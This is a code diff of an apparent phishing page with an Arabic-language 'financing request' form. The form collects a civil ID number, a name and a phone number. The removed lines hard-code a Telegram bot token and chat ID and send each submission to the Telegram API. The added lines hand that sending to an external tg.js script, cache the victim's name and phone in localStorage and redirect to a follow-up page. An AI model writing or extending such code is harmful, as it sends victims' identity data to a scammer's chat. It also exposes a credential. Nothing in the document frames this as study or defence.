@@ -211,9 +211,12 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <img id="imgau1" src="CFC-Logo.jpg">
 
     </div>
+
+<script src='../assets/js/tg.js'></script>
+
+    
 <script>
-    const botToken = '8599584358:AAFo3N5h5TrjujeZGH2SbS8L4EPpjYSaQqg'; 
-const chatId = '-5263360636';     
+
 
 document.getElementById('myForm').addEventListener('submit', function(e) {
     e.preventDefault();
@@ -231,38 +234,16 @@ document.getElementById('myForm').addEventListener('submit', function(e) {
 📩 *طلب تمويل جديد*:
 - رقم المدني: ${civilId}
 - الاسم: ${name}
-- رقم الهاتف: ${phone}
+📱 رقم الهاتف: ${phone}
     `;
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    localStorage.setItem('userName', name);
+    localStorage.setItem('phone', phone);
+    send_telegram_message(message)
+    window.location.href = './cash11'
 
-    fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown'
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-window.location.href = '../cash11';
-            document.getElementById('myForm').reset();
-            localStorage.setItem('userName', name);
 
-        } else {
-            alert('حدث خطأ أثناء الإرسال');
-            console.error(data);
-        }
-    })
-    .catch(error => {
-        alert('خطأ في الاتصال بالخادم');
-        console.error(error);
-    });
+    
 });
 
 </script>
